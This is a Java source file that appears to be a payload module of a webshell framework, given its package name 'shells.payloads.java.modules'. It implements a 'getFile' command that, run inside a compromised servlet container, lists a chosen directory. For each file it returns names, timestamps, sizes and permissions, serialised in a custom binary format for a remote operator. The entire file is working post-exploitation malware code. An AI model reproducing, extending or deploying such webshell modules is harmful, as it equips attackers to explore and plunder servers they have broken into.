package shells.payloads.java.modules;

import java.io.File;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class GetFileModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    private static byte[] intToBytes(int value) {
        return new byte[]{(byte)(value & 255), (byte)(value >> 8 & 255), (byte)(value >> 16 & 255), (byte)(value >> 24 & 255)};
    }

    private byte[] serialize(Map map) {
        java.util.Iterator keys = map.keySet().iterator();
        java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();

        while(keys.hasNext()) {
            try {
                String key = (String)keys.next();
                Object v = map.get(key);
                outputStream.write(key.getBytes());
                byte[] vb;
                if (v instanceof byte[]) {
                    outputStream.write(2);
                    vb = (byte[])v;
                } else if (v instanceof Map) {
                    outputStream.write(1);
                    vb = this.serialize((Map)v);
                } else {
                    outputStream.write(2);
                    vb = v == null ? "NULL".getBytes() : v.toString().getBytes();
                }

                outputStream.write(intToBytes(vb.length));
                outputStream.write(vb);
            } catch (Exception ignored) {
            }
        }

        return outputStream.toByteArray();
    }

    private Method getMethodByClass(Class clazz, String methodName, Class[] parameterTypes) {
        Method method = null;

        while(clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, parameterTypes);
                clazz = null;
            } catch (Exception ignored) {
                clazz = clazz.getSuperclass();
            }
        }

        return method;
    }

    private static void sortFilesByType(File[] files) {
        if (files != null && files.length >= 2) {
            quickSortFiles(files, 0, files.length - 1);
        }
    }

    private static void quickSortFiles(File[] files, int left, int right) {
        int i = left;
        int j = right;
        File pivot = files[(left + right) >>> 1];

        while(i <= j) {
            while(compareFilesByType(files[i], pivot) < 0) {
                ++i;
            }

            while(compareFilesByType(files[j], pivot) > 0) {
                --j;
            }

            if (i <= j) {
                File tmp = files[i];
                files[i] = files[j];
                files[j] = tmp;
                ++i;
                --j;
            }
        }

        if (left < j) {
            quickSortFiles(files, left, j);
        }

        if (i < right) {
            quickSortFiles(files, i, right);
        }
    }

    private static int compareFilesByType(File f1, File f2) {
        if (f1 == f2) {
            return 0;
        } else if (f1 == null) {
            return 1;
        } else if (f2 == null) {
            return -1;
        } else {
            boolean d1 = f1.isDirectory();
            boolean d2 = f2.isDirectory();
            if (d1 != d2) {
                return d1 ? -1 : 1;
            } else if (d1) {
                return String.CASE_INSENSITIVE_ORDER.compare(f1.getName(), f2.getName());
            } else {
                String e1 = getFileExtension(f1.getName());
                String e2 = getFileExtension(f2.getName());
                int extCmp = String.CASE_INSENSITIVE_ORDER.compare(e1, e2);
                return extCmp != 0 ? extCmp : String.CASE_INSENSITIVE_ORDER.compare(f1.getName(), f2.getName());
            }
        }
    }

    private static String getFileExtension(String fileName) {
        if (fileName == null) {
            return "";
        } else {
            int idx = fileName.lastIndexOf(46);
            if (idx > 0 && idx < fileName.length() - 1) {
                return fileName.substring(idx + 1);
            } else {
                return "";
            }
        }
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        String dirName = this.getString("dirName");
        HashMap result = new HashMap();
        if (dirName != null) {
            dirName = dirName.trim();

            try {
                String currentDir = (new File(dirName)).getAbsoluteFile() + "/";
                File dir = new File(currentDir);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        sortFilesByType(files);

                        for(int i = 0; i < files.length; ++i) {
                            HashMap fileMap = new HashMap();
                            File f = files[i];

                            try {
                                fileMap.put("0", f.getName());
                                fileMap.put("1", f.isDirectory() ? "0" : "1");
                                fileMap.put("2", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(f.lastModified())));
                                fileMap.put("3", Long.toString(f.length()));
                                StringBuffer perm = (new StringBuffer(String.valueOf(f.canRead() ? "R" : ""))).append(f.canWrite() ? "W" : "");

                                try {
                                    Method canExecute = this.getMethodByClass(File.class, "canExecute", (Class[])null);
                                    if (canExecute != null) {
                                        Boolean ok = (Boolean)canExecute.invoke(f, (Object[])null);
                                        if (ok != null && ok.booleanValue()) {
                                            perm.append("X");
                                        }
                                    }
                                } catch (Throwable ignored) {
                                }

                                String permStr = perm.toString();
                                fileMap.put("4", permStr != null && permStr.trim().length() != 0 ? permStr : "F");
                            } catch (Throwable t) {
                                fileMap.put("errMsg", t.getMessage());
                            }

                            result.put(String.valueOf(i), fileMap);
                        }

                        result.put("count", String.valueOf(files.length));
                        result.put("currentDir", currentDir);
                    }
                } else {
                    result.put("errMsg", "dir does not exist");
                }
            } catch (Exception e) {
                StringBuffer sb = new StringBuffer();
                sb.append("Exception errMsg:");
                sb.append(e.getMessage());
                result.put("errMsg", sb.toString());
            }
        } else {
            result.put("errMsg", "No parameter dirName");
        }

        return this.serialize(result);
    }

    public String getModuleName() {
        return "getFile";
    }
}
